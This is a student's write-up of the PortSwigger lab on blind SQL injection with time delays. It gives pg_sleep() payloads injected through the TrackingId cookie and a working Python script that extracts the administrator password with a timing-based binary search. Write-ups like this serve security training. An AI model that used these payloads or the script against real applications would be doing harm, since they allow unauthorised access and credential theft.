# Blind SQL injection with time delays

**Category:** Web Exploitation — SQL Injection
**Difficulty:** Practitioner
**Progress:** Solved

---

## Description

**Lab URL:** `https://portswigger.net/web-security/sql-injection/blind/lab-time-delays`



This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 

---

## Reconnaissance

- What does the application do? 
    - Still the same basic shop website
- Where is user input accepted? (forms, URL parameters, headers, cookies)
    - there is no input field (account login is back) but the user can input text into the url as before. The real input for the sqli happens in the cookie though.
- What happens with normal input?
    - inputting a normal word instead of the given categories prints the word on the page and shows no results, inputting the given categories works like it should

---

## Analysis

#### Technology Stack

 - Database:   PostgreSQL (see [Fingerprinting](#step-1---fingerprinting-the-database))
 - Input:      URL
 - Behavior:   blind SQL-injection


#### Vulnerability

- What exactly is vulnerable and why?
    
As per the lab instructions the cookie containing a `TrackingId` is vulnerable.
The sql in the background looks like this:
```sql
SELECT * FROM tracking WHERE id = [input]
```
This works like it should if there is just a TrackingId in the cookie, but if an Attacker puts sql in there this is unsafe.


The thing that makes this lab interesting is that the application uses some form of `try....catch` to catch the error we create. After that it just sends the usual http 200 ok response.
Delaying the SQL with `WAITFOR DELAY / pg_sleep()` does not throw an error.
If this is injected into sql the application executes it and if the delay was 10 seconds returns a respone 10 seconds later. Tieing this to a boolean condition is bascially the same as the earlier blind sql-injection. This time just looking for when the response is delayed and when not.

---

## Solution 

### Step 1 - Fingerprinting the database 

First step is to find the underlying database to not run into syntax errors later. Combining it with testing the the `pg_sleep()` function:
```sql
TrackingId=gLJk4jUtxhW9Y2sR'|| pg_sleep(3) ||'
```
takes indeed 3 seconds and then gives back the usual HTTP/2 200 OK

So it is PostgreSQL!

---

### Step 2 - Enumeration

First the basic query to ensure it is working:

```sql
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)||'
```
takes a while to respond, looks good.
```sql
'||(SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END)||'
```
returns instant. So it works.




### Step 3 - Extract / Exploit

The goal of this lab was only to exploit the vulnerability and cause 10 seconds delay. So:
```sql
TrackingId=LHDjcq5EW7cCRQxP'||(SELECT CASE WHEN SUBSTR(password,1, 1)='2' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'
```
solves the lab.
---


I also built a small python script that takes the whole request + the sites url and prints the admin password but it is not needed for this exercise:


```python

import sys
import string
import requests

raw = sys.argv[1]
cookie = ""
for line in raw.splitlines():
    if line.startswith("Cookie:"):
        cookie = line.strip()
        break

session = cookie.split("session=")[1].split(";")[0]
trackingid = cookie.split("TrackingId=")[1].split(";")[0]


url = sys.argv[2]
chars = string.digits + string.ascii_lowercase
password = ""
for pos in range(1,21):
    low = 0
    high = len(chars)-1		
    while low < high:
        mid = (low + high) // 2
        payload = f"'||(SELECT CASE WHEN SUBSTR(password,{pos}, 1)>'{chars[mid]}' THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'"	
        r = requests.get(url,
                         params={"category": "Gifts"},
                         cookies={"TrackingId": trackingid + payload,
                                  "session": session})
        
        if r.elapsed.total_seconds() > 2:
                low = mid + 1
                
                
        else:
                high = mid


    password += chars[low]
    print(f"pos {pos}: {chars[low]} -> {password}")
print("Password:", password)
```

## Real World Impact

Interesting showcase that even not returning anything or rather always returning the same response can still cause problems if attacker uses the variable time to get a bollean yes/no check. This is basically a leaked admin passwort again if an attacker is able to use python to script a fitting binary search.
---

## Learnings

- first verifiy the oracel (1=1 and 1=2) before moving on
- binary search > iteration
- binary search is difficult to get right -> the comparison (`>` / `<`) has to fit the if clause.
- do not choose delay too low in python script to not run into problems when smth just takes a moment naturally

